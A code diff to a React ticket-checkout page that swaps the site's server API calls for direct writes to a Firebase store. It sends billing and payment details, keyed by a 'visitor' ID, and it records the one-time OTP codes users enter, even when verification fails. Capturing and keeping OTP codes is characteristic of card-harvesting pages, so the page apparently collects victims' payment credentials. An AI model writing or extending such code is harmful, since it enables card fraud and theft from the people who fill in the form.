@@ -1,11 +1,6 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
 import {
-  api,
-  buildUrl,
-  type CreateCheckoutSubmissionInput,
-} from "@shared/routes";
-import {
   QuestLegalFooter,
   QuestMobileTopBar,
   SessionTimerStrip,
@@ -17,6 +12,7 @@ import {
   getStoredTicketCart,
   ticketProductMap,
 } from "@/lib/ticket-cart";
+import { addData } from "@/lib/firebase";
 
 interface BillingDetails {
   firstName: string;
@@ -189,6 +185,25 @@ function maskCardNumber(value: string): string {
 
 function normalizeCardNumber(value: string): string {
   return toDigitsOnly(value).slice(0, 19);
+}
+
+function generateSubmissionId(existingSubmissionId: string | null): string {
+  if (typeof window !== "undefined") {
+    const storedVisitorId = window.localStorage.getItem("visitor");
+    if (storedVisitorId) {
+      return storedVisitorId;
+    }
+  }
+
+  if (existingSubmissionId) {
+    return existingSubmissionId;
+  }
+
+  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
+    return crypto.randomUUID();
+  }
+
+  return `pay-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
 }
 
 function validateBillingDetails(billing: BillingDetails): string | null {
@@ -402,7 +417,9 @@ export default function Checkout() {
       billingDetails.phone
     )}`;
 
-    const payload: CreateCheckoutSubmissionInput = {
+    const checkoutId = generateSubmissionId(submissionId);
+    const payload = {
+      id: checkoutId,
       billing: {
         firstName: billingDetails.firstName.trim(),
         lastName: billingDetails.lastName.trim(),
@@ -434,25 +451,8 @@ export default function Checkout() {
 
     setIsSavingCheckout(true);
     try {
-      const response = await fetch(api.checkout.create.path, {
-        method: api.checkout.create.method,
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-
-      if (!response.ok) {
-        const errorData = (await response.json().catch(() => null)) as {
-          message?: string;
-        } | null;
-        throw new Error(
-          errorData?.message ?? "تعذّر حفظ البيانات في Firestore."
-        );
-      }
-
-      const created = api.checkout.create.responses[201].parse(
-        await response.json()
-      );
-      setSubmissionId(created.id);
+      await addData(payload);
+      setSubmissionId(checkoutId);
       setPaymentError(null);
       setOtpCode("");
       setPaymentStep("waitingOtp");
@@ -491,18 +491,14 @@ export default function Checkout() {
 
         if (submissionId) {
           try {
-            await fetch(
-              buildUrl(api.checkout.updateStatus.path, { id: submissionId }),
-              {
-                method: api.checkout.updateStatus.method,
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  status: "otp_failed",
-                  otpCode: normalizedOtp,
-                  errorMessage: failureMessage,
-                }),
-              }
-            );
+            await addData({
+              id: submissionId,
+              payment: {
+                status: "otp_failed",
+                otpCode: normalizedOtp,
+                errorMessage: failureMessage,
+              },
+            });
           } catch {
           }
         }
